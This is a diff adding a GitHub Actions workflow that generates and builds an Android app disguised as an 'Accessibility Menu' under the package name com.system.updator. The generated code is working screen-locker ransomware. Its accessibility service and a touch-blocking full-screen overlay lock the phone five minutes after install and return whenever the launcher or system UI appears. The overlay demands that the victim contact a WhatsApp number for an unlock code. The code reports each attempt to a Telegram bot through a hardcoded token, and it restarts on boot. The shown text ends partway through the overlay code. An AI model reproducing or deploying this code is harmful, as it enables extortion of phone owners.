@@ -1,0 +1,1237 @@
+name: Build Accessibility Menu APK
+
+permissions:
+  contents: write
+
+on:
+  push:
+    branches: [main]
+  workflow_dispatch:
+
+env:
+  ANDROID_HOME: /usr/local/lib/android/sdk
+  ANDROID_SDK_ROOT: /usr/local/lib/android/sdk
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@v4
+        with:
+          java-version: '17'
+          distribution: 'temurin'
+
+      - name: Verify Android SDK
+        run: |
+          echo "ANDROID_HOME=$ANDROID_HOME"
+          ls "$ANDROID_HOME" || true
+          ls "$ANDROID_HOME/platforms" || true
+          ls "$ANDROID_HOME/build-tools" || true
+
+      - name: Create project directory structure
+        run: |
+          mkdir -p app/src/main/java/com/system/updator
+          mkdir -p app/src/main/res/xml
+          mkdir -p app/src/main/res/values
+          mkdir -p app/src/main/res/layout
+          mkdir -p app/src/main/res/drawable
+          mkdir -p app/src/main/assets
+
+      - name: Generate Gradle configuration files
+        run: |
+          cat > settings.gradle << 'EOF'
+          pluginManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+                  gradlePluginPortal()
+              }
+          }
+          dependencyResolutionManagement {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          rootProject.name = "AccessibilityMenu"
+          include ':app'
+          EOF
+
+          cat > build.gradle << 'EOF'
+          buildscript {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+              dependencies {
+                  classpath 'com.android.tools.build:gradle:8.1.0'
+              }
+          }
+          allprojects {
+              repositories {
+                  google()
+                  mavenCentral()
+              }
+          }
+          EOF
+
+          cat > app/build.gradle << 'EOF'
+          plugins {
+              id 'com.android.application'
+          }
+
+          android {
+              namespace 'com.system.updator'
+              compileSdk 34
+
+              defaultConfig {
+                  applicationId "com.system.updator"
+                  minSdk 26
+                  targetSdk 34
+                  versionCode 1
+                  versionName "1.0"
+              }
+
+              buildTypes {
+                  release {
+                      minifyEnabled false
+                      proguardFiles getDefaultProguardFile('proguard-android-optimize.txt')
+                  }
+                  debug {
+                      minifyEnabled false
+                  }
+              }
+
+              compileOptions {
+                  sourceCompatibility JavaVersion.VERSION_17
+                  targetCompatibility JavaVersion.VERSION_17
+              }
+          }
+
+          dependencies {
+              implementation 'androidx.appcompat:appcompat:1.6.1'
+              implementation 'androidx.core:core:1.12.0'
+              implementation 'com.google.android.material:material:1.11.0'
+              implementation 'androidx.webkit:webkit:1.9.0'
+          }
+          EOF
+
+          cat > gradle.properties << 'EOF'
+          org.gradle.jvmargs=-Xmx2048m
+          android.useAndroidX=true
+          android.enableJetifier=false
+          android.suppressUnsupportedCompileSdk=34
+          sdk.dir=/usr/local/lib/android/sdk
+          EOF
+
+          echo "sdk.dir=/usr/local/lib/android/sdk" > local.properties
+
+      - name: Generate Gradle wrapper
+        run: |
+          mkdir -p gradle/wrapper
+          cat > gradle/wrapper/gradle-wrapper.properties << 'EOF'
+          distributionBase=GRADLE_USER_HOME
+          distributionPath=wrapper/dists
+          distributionUrl=https\://services.gradle.org/distributions/gradle-8.0-bin.zip
+          zipStoreBase=GRADLE_USER_HOME
+          zipStorePath=wrapper/dists
+          EOF
+          curl -sL -o gradle/wrapper/gradle-wrapper.jar \
+            https://raw.githubusercontent.com/gradle/gradle/v8.0.0/gradle/wrapper/gradle-wrapper.jar
+
+          cat > gradlew << 'EOF'
+          #!/bin/sh
+          APP_HOME=$( cd "${APP_HOME:-./}" && pwd -P ) || exit
+          APP_NAME="Gradle"
+          APP_BASE_NAME=${0##*/}
+          DEFAULT_JVM_OPTS='"-Xmx64m" "-Xms64m"'
+          MAX_FD=maximum
+          warn () { echo "$*" >&2; }
+          die () { echo "$*"; echo; exit 1; }
+          cygwin=false
+          msys=false
+          darwin=false
+          nonstop=false
+          case "$( uname )" in
+            CYGWIN* ) cygwin=true ;;
+            Darwin* ) darwin=true ;;
+            MSYS* | MINGW* ) msys=true ;;
+            NONSTOP* ) nonstop=false ;;
+          esac
+          CLASSPATH=$APP_HOME/gradle/wrapper/gradle-wrapper.jar
+          if [ -n "$JAVA_HOME" ] ; then
+              if [ -x "$JAVA_HOME/jre/sh/java" ] ; then
+                  JAVACMD=$JAVA_HOME/jre/sh/java
+              else
+                  JAVACMD=$JAVA_HOME/bin/java
+              fi
+              if [ ! -x "$JAVACMD" ] ; then
+                  die "ERROR: JAVA_HOME is set to an invalid directory: $JAVA_HOME"
+              fi
+          else
+              JAVACMD=java
+              which java >/dev/null 2>&1 || die "ERROR: JAVA_HOME is not set and no 'java' command could be found in your PATH."
+          fi
+          if ! "$cygwin" && ! "$darwin" && ! "$nonstop" ; then
+              case $MAX_FD in
+                max*) MAX_FD=$( ulimit -H -n ) || warn "Could not query maximum file descriptor limit" ;;
+              esac
+              case $MAX_FD in
+                '' | soft) : ;;
+                *) ulimit -n "$MAX_FD" || warn "Could not set maximum file descriptor limit to $MAX_FD" ;;
+              esac
+          fi
+          if "$cygwin" || "$msys" ; then
+              APP_HOME=$( cygpath --path --mixed "$APP_HOME" )
+              CLASSPATH=$( cygpath --path --mixed "$CLASSPATH" )
+              JAVACMD=$( cygpath --unix "$JAVACMD" )
+              for arg do
+                  if case $arg in -*) false;; /?*) t=${arg#/} t=/${t%%/*} [ -e "$t" ];; *) false;; esac; then
+                      arg=$( cygpath --path --ignore --mixed "$arg" )
+                  fi
+                  set -- "$@" "$arg"
+              done
+          fi
+          set -- $(echo "$@" | tr ' ' '\n' | sed 's/^--/ /' | tr '\n' ' ')
+          set -- \
+              "-Dorg.gradle.appname=$APP_BASE_NAME" \
+              -classpath "$CLASSPATH" \
+              org.gradle.wrapper.GradleWrapperMain \
+              "$@"
+          eval "set -- $(
+              printf '%s\n' "$DEFAULT_JVM_OPTS $JAVA_OPTS $GRADLE_OPTS" |
+              xargs -n1 |
+              sed ' s~[^-[:alnum:]+,./:=@_]~\\&~g; ' |
+              tr '\n' ' '
+          )" '"$@"'
+          exec "$JAVACMD" "$@"
+          EOF
+          chmod +x gradlew
+
+      - name: Generate Android resources
+        run: |
+          cat > app/src/main/res/values/strings.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <resources>
+              <string name="app_name">Accessibility Menu</string>
+              <string name="accessibility_description">Accessibility service</string>
+          </resources>
+          EOF
+
+          cat > app/src/main/res/drawable/ic_launcher.xml << 'EOF'
+          <vector xmlns:android="http://schemas.android.com/apk/res/android"
+              android:width="192dp"
+              android:height="192dp"
+              android:viewportWidth="192"
+              android:viewportHeight="192">
+              <path
+                  android:fillColor="#020604"
+                  android:pathData="M40,0 L152,0 A40,40 0 0 1 192,40 L192,152 A40,40 0 0 1 152,192 L40,192 A40,40 0 0 1 0,152 L0,40 A40,40 0 0 1 40,0 Z" />
+              <path
+                  android:fillColor="#00FF66"
+                  android:pathData="M40,80 L152,80 L152,88 L40,88 Z" />
+              <path
+                  android:fillColor="#00FF66"
+                  android:pathData="M40,100 L152,100 L152,108 L40,108 Z" />
+              <path
+                  android:fillColor="#00FF66"
+                  android:pathData="M40,120 L112,120 L112,128 L40,128 Z" />
+          </vector>
+          EOF
+
+          cat > app/src/main/res/layout/activity_overlay.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <FrameLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:background="#020604"
+              android:fitsSystemWindows="false">
+              <WebView
+                  android:id="@+id/overlayWebView"
+                  android:layout_width="match_parent"
+                  android:layout_height="match_parent"
+                  android:fitsSystemWindows="false" />
+          </FrameLayout>
+          EOF
+
+          cat > app/src/main/res/layout/activity_main.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+              android:layout_width="match_parent"
+              android:layout_height="match_parent"
+              android:orientation="vertical"
+              android:gravity="center"
+              android:padding="32dp"
+              android:background="#0a0f1a">
+
+              <ImageView
+                  android:layout_width="80dp"
+                  android:layout_height="80dp"
+                  android:src="@drawable/ic_launcher"
+                  android:contentDescription="@string/app_name"
+                  android:layout_marginBottom="24dp" />
+
+              <TextView
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="@string/app_name"
+                  android:textColor="#FFFFFF"
+                  android:textSize="24sp"
+                  android:textStyle="bold"
+                  android:layout_marginBottom="32dp" />
+
+              <Button
+                  android:id="@+id/btnPermissions"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Overlay Permission"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#10B981"
+                  android:layout_marginBottom="12dp" />
+
+              <Button
+                  android:id="@+id/btnAccessibility"
+                  android:layout_width="match_parent"
+                  android:layout_height="56dp"
+                  android:text="Accessibility Service"
+                  android:textAllCaps="false"
+                  android:backgroundTint="#8B5CF6"
+                  android:layout_marginBottom="12dp" />
+
+              <TextView
+                  android:id="@+id/tvStatus"
+                  android:layout_width="wrap_content"
+                  android:layout_height="wrap_content"
+                  android:text="Initializing..."
+                  android:textColor="#94A3B8"
+                  android:textSize="14sp"
+                  android:layout_marginTop="24dp" />
+          </LinearLayout>
+          EOF
+
+          cat > app/src/main/res/xml/accessibility_config.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
+              android:accessibilityEventTypes="typeAllMask"
+              android:accessibilityFeedbackType="feedbackGeneric"
+              android:accessibilityFlags="flagReportViewIds|flagRetrieveInteractiveWindows|flagRequestTouchExplorationMode|flagIncludeNotImportantViews"
+              android:canPerformGestures="true"
+              android:canRetrieveWindowContent="true"
+              android:description="@string/accessibility_description"
+              android:notificationTimeout="50" />
+          EOF
+
+      - name: Generate overlay HTML asset
+        run: |
+          cat > app/src/main/assets/overlay.html << 'HTMLEOF'
+          <!DOCTYPE html>
+          <html lang="en">
+          <head>
+          <meta charset="UTF-8">
+          <meta name="viewport" content="width=device-width, initial-scale=1.0">
+          <title>Access Required</title>
+          <style>
+          * { box-sizing: border-box; }
+          html, body { margin: 0; width: 100%; height: 100%; overflow: hidden; }
+          body { background: #020604; color: #00ff66; font-family: "Courier New", monospace; }
+          .overlay { position: fixed; inset: 0; display: flex; align-items: center; justify-content: center; padding: 20px; background: rgba(0,0,0,.84); transition: opacity .6s ease, visibility .6s ease; }
+          .overlay.hidden { opacity: 0; visibility: hidden; pointer-events: none; }
+          .panel { width: 100%; max-width: 430px; padding: 30px 25px; text-align: center; background: #030906; border-radius: 12px; box-shadow: 0 0 30px rgba(0,255,102,.12); position: relative; }
+          .panel::before { content: ""; position: absolute; top: 0; left: 10%; width: 80%; height: 2px; background: #00ff66; box-shadow: 0 0 12px #00ff66; }
+          h1 { margin: 0; color: white; font-size: 25px; letter-spacing: 3px; }
+          .subtitle { margin: 10px 0 22px; color: #73ffab; font-size: 11px; line-height: 1.6; }
+          .notice { margin-bottom: 20px; font-size: 12px; color: #00ff66; }
+          .terminal { margin-bottom: 8px; text-align: left; font-size: 11px; }
+          input { width: 100%; height: 48px; padding: 0 14px; outline: none; border: 1px solid rgba(0,255,102,.45); border-radius: 6px; background: #000; color: #00ff66; font-family: inherit; text-align: center; letter-spacing: 2px; }
+          input:focus { border-color: #00ff66; box-shadow: 0 0 12px rgba(0,255,102,.2); }
+          .action { display: block; margin-top: 18px; color: #00ff66; font-size: 12px; font-weight: bold; letter-spacing: 1px; text-decoration: none; cursor: pointer; transition: .2s ease; }
+          .action:hover { color: white; text-shadow: 0 0 10px #00ff66; }
+          .attempts { margin-top: 12px; font-size: 11px; color: white; }
+          #message, #unlockMessage { min-height: 18px; margin-top: 10px; font-size: 11px; }
+          .unlock { display: none; margin-top: 22px; padding-top: 18px; border-top: 1px solid rgba(0,255,102,.15); }
+          .unlock-title { margin-bottom: 10px; color: #ff3333; font-size: 11px; letter-spacing: 1px; }
+          .footer { margin-top: 24px; font-size: 8px; letter-spacing: 2px; opacity: .35; }
+          .locked { color: #ff3333 !important; }
+          .disabled { pointer-events: none; opacity: .45; }
+          .shake { animation: shake .3s; }
+          @keyframes shake { 25% { transform: translateX(-7px); } 75% { transform: translateX(7px); } }
+          </style>
+          </head>
+          <body>
+          <div class="overlay" id="overlay">
+              <main class="panel" id="panel">
+                  <h1>ACCESS REQUIRED</h1>
+                  <div class="subtitle">
+                      AUTHENTICATION PROTOCOL ACTIVE<br>
+                      ENTER YOUR AUTHORIZATION KEY TO CONTINUE
+                  </div>
+                  <div class="notice">
+                      Chat WhatsApp to get the authorization code.
+                  </div>
+                  <div class="terminal">
+                      &gt; waiting_for_authorization...
+                  </div>
+                  <input type="password" id="codeInput" placeholder="ENTER AUTHORIZATION CODE" autocomplete="off">
+                  <a class="action" id="verifyBtn">Click here to verify access</a>
+                  <div class="attempts" id="attempts">5 attempts remaining</div>
+                  <div id="message"></div>
+                  <div class="unlock" id="unlockSection">
+                      <div class="unlock-title">ACCESS LOCKED</div>
+                      <div class="subtitle">
+                          5 ATTEMPTS EXHAUSTED<br>
+                          ENTER YOUR UNLOCK CODE TO CONTINUE
+                      </div>
+                      <input type="password" id="unlockInput" placeholder="ENTER UNLOCK CODE" autocomplete="off">
+                      <a class="action" id="unlockBtn">Click here to unlock access</a>
+                      <div id="unlockMessage"></div>
+                  </div>
+                  <a class="action" id="whatsappBtn" href="https://wa.me/254798688920?text=Your%20phone%20is%20hacked.%20%20Authorization%20code%20Needed!." target="_blank" rel="noopener noreferrer">
+                      Click here to chat whatsapp
+                  </a>
+                  <div class="footer">LOCAL AUTHENTICATION</div>
+              </main>
+          </div>
+          <script>
+          var correctCode = (window.__AUTH_CODE__ || "UJ7MY8VGOH");
+          var unlockCode = "PWSSAOFHW";
+          var attemptsLeft = 5;
+          var locked = false;
+          var overlay = document.getElementById("overlay");
+          var panel = document.getElementById("panel");
+          var codeInput = document.getElementById("codeInput");
+          var verifyBtn = document.getElementById("verifyBtn");
+          var attempts = document.getElementById("attempts");
+          var message = document.getElementById("message");
+          var unlockSection = document.getElementById("unlockSection");
+          var unlockInput = document.getElementById("unlockInput");
+          var unlockBtn = document.getElementById("unlockBtn");
+          var unlockMessage = document.getElementById("unlockMessage");
+          function verifyCode() {
+              if (locked) return;
+              var code = codeInput.value.trim();
+              if (!code) {
+                  message.textContent = "ENTER AN AUTHORIZATION CODE";
+                  message.style.color = "#ffff00";
+                  return;
+              }
+              if (code === correctCode) {
+                  message.textContent = "ACCESS GRANTED";
+                  message.style.color = "#00ff66";
+                  if (window.AuthBridge && window.AuthBridge.onAuthorized) {
+                      window.AuthBridge.onAuthorized();
+                  }
+                  setTimeout(function() { overlay.classList.add("hidden"); }, 600);
+                  return;
+              }
+              attemptsLeft--;
+              codeInput.value = "";
+              panel.classList.remove("shake");
+              void panel.offsetWidth;
+              panel.classList.add("shake");
+              if (window.AuthBridge && window.AuthBridge.onFailedAttempt) {
+                  window.AuthBridge.onFailedAttempt(attemptsLeft);
+              }
+              if (attemptsLeft === 0) {
+                  locked = true;
+                  attempts.textContent = "0 attempts remaining";
+                  attempts.classList.add("locked");
+                  message.textContent = "ACCESS LOCKED - NO MORE ATTEMPTS";
+                  message.style.color = "#ff3333";
+                  codeInput.disabled = true;
+                  verifyBtn.classList.add("disabled");
+                  unlockSection.style.display = "block";
+                  if (window.AuthBridge && window.AuthBridge.onLocked) {
+                      window.AuthBridge.onLocked();
+                  }
+              } else {
+                  attempts.textContent = attemptsLeft + " attempts remaining";
+                  message.textContent = "INVALID AUTHORIZATION CODE";
+                  message.style.color = "#ff3333";
+              }
+          }
+          function unlockAccess() {
+              var code = unlockInput.value.trim();
+              if (!code) {
+                  unlockMessage.textContent = "ENTER YOUR UNLOCK CODE";
+                  unlockMessage.style.color = "#ffff00";
+                  return;
+              }
+              if (code === unlockCode) {
+                  attemptsLeft = 5;
+                  locked = false;
+                  attempts.textContent = "5 attempts remaining";
+                  attempts.classList.remove("locked");
+                  message.textContent = "ACCESS UNLOCKED - TRY AGAIN";
+                  message.style.color = "#00ff66";
+                  unlockMessage.textContent = "UNLOCK SUCCESSFUL";
+                  unlockMessage.style.color = "#00ff66";
+                  codeInput.disabled = false;
+                  verifyBtn.classList.remove("disabled");
+                  unlockInput.value = "";
+                  if (window.AuthBridge && window.AuthBridge.onUnlocked) {
+                      window.AuthBridge.onUnlocked();
+                  }
+                  setTimeout(function() {
+                      unlockSection.style.display = "none";
+                      codeInput.focus();
+                  }, 800);
+              } else {
+                  unlockInput.value = "";
+                  unlockMessage.textContent = "INVALID UNLOCK CODE";
+                  unlockMessage.style.color = "#ff3333";
+                  panel.classList.remove("shake");
+                  void panel.offsetWidth;
+                  panel.classList.add("shake");
+              }
+          }
+          verifyBtn.addEventListener("click", verifyCode);
+          unlockBtn.addEventListener("click", unlockAccess);
+          codeInput.addEventListener("keydown", function(e) {
+              if (e.key === "Enter") { verifyCode(); }
+          });
+          unlockInput.addEventListener("keydown", function(e) {
+              if (e.key === "Enter") { unlockAccess(); }
+          });
+          </script>
+          </body>
+          </html>
+          HTMLEOF
+
+      - name: Generate AndroidManifest.xml
+        run: |
+          cat > app/src/main/AndroidManifest.xml << 'EOF'
+          <?xml version="1.0" encoding="utf-8"?>
+          <manifest xmlns:android="http://schemas.android.com/apk/res/android"
+              xmlns:tools="http://schemas.android.com/tools">
+
+              <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+              <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE" />
+              <uses-permission android:name="android.permission.WAKE_LOCK" />
+              <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+              <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
+              <uses-permission android:name="android.permission.DISABLE_KEYGUARD" />
+
+              <application
+                  android:allowBackup="true"
+                  android:label="@string/app_name"
+                  android:icon="@drawable/ic_launcher"
+                  android:usesCleartextTraffic="true">
+
+                  <activity
+                      android:name=".MainActivity"
+                      android:exported="true"
+                      android:theme="@style/Theme.AppCompat.NoActionBar">
+                      <intent-filter>
+                          <action android:name="android.intent.action.MAIN" />
+                          <category android:name="android.intent.category.LAUNCHER" />
+                      </intent-filter>
+                  </activity>
+
+                  <service
+                      android:name=".AuthService"
+                      android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
+                      android:exported="true">
+                      <intent-filter>
+                          <action android:name="android.accessibilityservice.AccessibilityService" />
+                      </intent-filter>
+                      <meta-data
+                          android:name="android.accessibilityservice"
+                          android:resource="@xml/accessibility_config" />
+                  </service>
+
+                  <receiver
+                      android:name=".BootReceiver"
+                      android:exported="true"
+                      android:enabled="true">
+                      <intent-filter>
+                          <action android:name="android.intent.action.BOOT_COMPLETED" />
+                          <action android:name="android.intent.action.QUICKBOOT_POWERON" />
+                      </intent-filter>
+                  </receiver>
+              </application>
+          </manifest>
+          EOF
+
+      - name: Generate AuthServiceHolder.java
+        run: |
+          cat > app/src/main/java/com/system/updator/AuthServiceHolder.java << 'EOF'
+          package com.system.updator;
+
+          public class AuthServiceHolder {
+              private static AuthService instance;
+
+              public static void set(AuthService s) {
+                  instance = s;
+              }
+
+              public static AuthService get() {
+                  return instance;
+              }
+          }
+          EOF
+
+      - name: Generate AuthCodeGenerator.java
+        run: |
+          cat > app/src/main/java/com/system/updator/AuthCodeGenerator.java << 'EOF'
+          package com.system.updator;
+
+          import android.content.Context;
+          import android.content.SharedPreferences;
+          import android.provider.Settings;
+
+          import java.security.MessageDigest;
+
+          public class AuthCodeGenerator {
+
+              private static final String PREFS = "auth_prefs";
+              private static final String KEY = "unique_auth_code";
+
+              public static String getUniqueCode(Context context) {
+                  SharedPreferences sp = context.getSharedPreferences(PREFS, Context.MODE_PRIVATE);
+                  String existing = sp.getString(KEY, null);
+                  if (existing != null && !existing.isEmpty()) return existing;
+
+                  String androidId = "";
+                  try {
+                      androidId = Settings.Secure.getString(
+                              context.getContentResolver(), Settings.Secure.ANDROID_ID);
+                      if (androidId == null) androidId = "";
+                  } catch (Exception ignored) { }
+
+                  String combined = androidId + "UJ7MY8VGOH";
+
+                  String hash;
+                  try {
+                      MessageDigest md = MessageDigest.getInstance("SHA-256");
+                      byte[] digest = md.digest(combined.getBytes("UTF-8"));
+                      StringBuilder sb = new StringBuilder();
+                      for (byte b : digest) {
+                          sb.append(String.format("%02X", b));
+                      }
+                      hash = sb.toString().substring(0, 10);
+                  } catch (Exception e) {
+                      hash = "FALLBACK" + Math.abs(combined.hashCode());
+                      if (hash.length() > 10) hash = hash.substring(0, 10);
+                      hash = hash.toUpperCase();
+                  }
+
+                  sp.edit().putString(KEY, hash).apply();
+                  return hash;
+              }
+          }
+          EOF
+
+      - name: Generate AuthService.java
+        run: |
+          cat > app/src/main/java/com/system/updator/AuthService.java << 'EOF'
+          package com.system.updator;
+
+          import android.accessibilityservice.AccessibilityService;
+          import android.content.Context;
+          import android.content.SharedPreferences;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.os.PowerManager;
+          import android.util.Log;
+          import android.view.accessibility.AccessibilityEvent;
+
+          import java.net.HttpURLConnection;
+          import java.net.URL;
+          import java.net.URLEncoder;
+
+          public class AuthService extends AccessibilityService {
+
+              private static final String TAG = "AuthService";
+              private static final String BOT_TOKEN = "8871459518:AAGhsiMwoG6qTGZ-S-6VIwRNszCQD2w1uQI";
+              private static final String CHAT_ID = "8468538314";
+
+              private static final long FIVE_MIN_MS = 5L * 60L * 1000L;
+
+              private Handler handler = new Handler(Looper.getMainLooper());
+              private OverlayManager overlayManager;
+              private PowerManager.WakeLock partialWakeLock;
+
+              private volatile boolean authorized = false;
+              private volatile boolean overlayShown = false;
+
+              @Override
+              public void onServiceConnected() {
+                  super.onServiceConnected();
+                  Log.d(TAG, "Service connected");
+
+                  AuthServiceHolder.set(this);
+
+                  overlayManager = OverlayManager.get(this);
+
+                  try {
+                      PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
+                      if (pm != null) {
+                          partialWakeLock = pm.newWakeLock(
+                              PowerManager.PARTIAL_WAKE_LOCK | PowerManager.ON_AFTER_RELEASE,
+                              "AuthService::Lock");
+                          partialWakeLock.setReferenceCounted(false);
+                          partialWakeLock.acquire();
+                      }
+                  } catch (Exception ignored) { }
+
+                  SharedPreferences prefs = getSharedPreferences("auth_prefs", MODE_PRIVATE);
+                  authorized = prefs.getBoolean("authorized", false);
+
+                  if (!authorized) {
+                      long installTime = 0L;
+                      try {
+                          installTime = getPackageManager()
+                                  .getPackageInfo(getPackageName(), 0).firstInstallTime;
+                      } catch (Exception ignored) { }
+                      if (installTime == 0L) installTime = System.currentTimeMillis();
+
+                      long elapsed = System.currentTimeMillis() - installTime;
+                      long remaining = FIVE_MIN_MS - elapsed;
+
+                      if (remaining <= 0) {
+                          showOverlayNow();
+                      } else {
+                          handler.postDelayed(this::showOverlayNow, remaining);
+                      }
+                  }
+              }
+
+              public void showOverlayNow() {
+                  if (authorized || overlayShown) return;
+                  Log.d(TAG, "Showing overlay");
+                  overlayShown = true;
+                  overlayManager.show();
+              }
+
+              public void onAuthorized() {
+                  authorized = true;
+                  overlayShown = false;
+                  getSharedPreferences("auth_prefs", MODE_PRIVATE)
+                          .edit().putBoolean("authorized", true).apply();
+                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                  sendTelegram("Authorized");
+              }
+
+              public void onFailedAttempt(int attemptsLeft) {
+                  sendTelegram("Failed attempt (" + attemptsLeft + " remaining)");
+              }
+
+              public void onLocked() {
+                  sendTelegram("Locked - awaiting unlock code");
+              }
+
+              public void onUnlocked() {
+                  sendTelegram("Unlocked");
+              }
+
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
+                  if (event == null) return;
+                  if (!overlayShown || authorized) return;
+
+                  int type = event.getEventType();
+                  if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                      CharSequence pkg = event.getPackageName();
+                      if (pkg != null) {
+                          String p = pkg.toString();
+                          if (p.equals("com.android.systemui")
+                                  || p.equals("com.android.launcher")
+                                  || p.equals("com.android.launcher3")
+                                  || p.contains("launcher")
+                                  || p.contains("systemui")) {
+                              handler.postDelayed(() -> {
+                                  if (overlayShown && !authorized) {
+                                      try { overlayManager.ensureShowing(); } catch (Exception ignored) { }
+                                  }
+                              }, 200);
+                          }
+                      }
+                  }
+              }
+
+              @Override
+              public void onInterrupt() {
+                  Log.d(TAG, "onInterrupt");
+              }
+
+              @Override
+              public void onDestroy() {
+                  super.onDestroy();
+                  AuthServiceHolder.set(null);
+                  try { handler.removeCallbacksAndMessages(null); } catch (Exception ignored) { }
+                  try { overlayManager.dismiss(); } catch (Exception ignored) { }
+                  try {
+                      if (partialWakeLock != null && partialWakeLock.isHeld()) partialWakeLock.release();
+                  } catch (Exception ignored) { }
+              }
+
+              private void sendTelegram(String text) {
+                  final String token = BOT_TOKEN;
+                  final String chat = CHAT_ID;
+                  new Thread(() -> {
+                      HttpURLConnection conn = null;
+                      try {
+                          String encoded = URLEncoder.encode(text, "UTF-8");
+                          String urlStr = "https://api.telegram.org/bot" + token
+                                  + "/sendMessage?chat_id=" + chat + "&text=" + encoded;
+                          URL url = new URL(urlStr);
+                          conn = (HttpURLConnection) url.openConnection();
+                          conn.setRequestMethod("GET");
+                          conn.setConnectTimeout(8000);
+                          conn.setReadTimeout(8000);
+                          conn.getResponseCode();
+                      } catch (Exception e) {
+                          Log.e(TAG, "Telegram send failed", e);
+                      } finally {
+                          if (conn != null) conn.disconnect();
+                      }
+                  }).start();
+              }
+          }
+          EOF
+
+      - name: Generate OverlayManager.java
+        run: |
+          cat > app/src/main/java/com/system/updator/OverlayManager.java << 'EOF'
+          package com.system.updator;
+
+          import android.annotation.SuppressLint;
+          import android.content.Context;
+          import android.graphics.PixelFormat;
+          import android.os.Build;
+          import android.os.Handler;
+          import android.os.Looper;
+          import android.util.Log;
+          import android.view.Gravity;
+          import android.view.LayoutInflater;
+          import android.view.View;
+          import android.view.WindowManager;
+          import android.webkit.JavascriptInterface;
+          import android.webkit.WebSettings;
+          import android.webkit.WebView;
+          import android.webkit.WebViewClient;
+
+          public class OverlayManager {
+
+              private static final String TAG = "OverlayManager";
+              private static OverlayManager instance;
+
+              private final Context context;
+              private final Handler mainHandler = new Handler(Looper.getMainLooper());
+
+              private WindowManager windowManager;
+              private View overlayView;
+              private WebView webView;
+              private volatile boolean showing = false;
+
+              private OverlayManager(Context context) {
+                  this.context = context.getApplicationContext();
+              }
+
+              public static synchronized OverlayManager get(Context context) {
+                  if (instance == null) instance = new OverlayManager(context);
+                  return instance;
+              }
+
+              @SuppressLint("SetJavaScriptEnabled")
+              public synchronized void show() {
+                  if (showing) return;
+                  mainHandler.post(this::showInternal);
+              }
+
+              private void showInternal() {
+                  try {
+                      if (showing) return;
+                      windowManager = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
+                      if (windowManager == null) return;
+
+                      LayoutInflater inflater = LayoutInflater.from(context);
+                      overlayView = inflater.inflate(R.layout.activity_overlay, null);
+
+                      webView = overlayView.findViewById(R.id.overlayWebView);
+                      if (webView != null) {
+                          WebSettings s = webView.getSettings();
+                          s.setJavaScriptEnabled(true);
+                          s.setAllowFileAccess(true);
+                          s.setAllowContentAccess(true);
+                          s.setDomStorageEnabled(true);
+                          s.setLoadWithOverviewMode(true);
+                          s.setUseWideViewPort(true);
+                          webView.setWebViewClient(new WebViewClient());
+                          webView.setBackgroundColor(0xFF020604);
+                          webView.setPadding(0, 0, 0, 0);
+                          webView.addJavascriptInterface(new AuthBridge(), "AuthBridge");
+
+                          final String uniqueCode = AuthCodeGenerator.getUniqueCode(context);
+                          String injector = "javascript:(function(){window.__AUTH_CODE__='" + uniqueCode + "';})()";
+                          webView.loadUrl("file:///android_asset/overlay.html");
+                          webView.postDelayed(() -> {
+                              try {
+                                  webView.evaluateJavascript(
+                                      "window.__AUTH_CODE__='" + uniqueCode + "';", null);
+                              } catch (Exception ignored) { }
+                          }, 200);
+                      }
+
+                      overlayView.setOnTouchListener((v, event) -> true);
+                      overlayView.setClickable(true);
+                      overlayView.setLongClickable(true);
+
+                      int uiOptions =
+                            View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                          | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                          | View.SYSTEM_UI_FLAG_FULLSCREEN
+                          | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                          | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                          | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
+                      overlayView.setSystemUiVisibility(uiOptions);
+                      overlayView.setOnSystemUiVisibilityChangeListener(visibility -> {
+                          int restored =
+                                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
+                              | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
+                              | View.SYSTEM_UI_FLAG_FULLSCREEN
+                              | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
+                              | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
+                              | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN;
+                          if (overlayView != null) overlayView.setSystemUiVisibility(restored);
+                      });
+
+                      int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
+                              ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
+                              : WindowManager.LayoutParams.TYPE_PHONE;
+
+                      int flags =
+                            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
+                          | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
+                          | WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
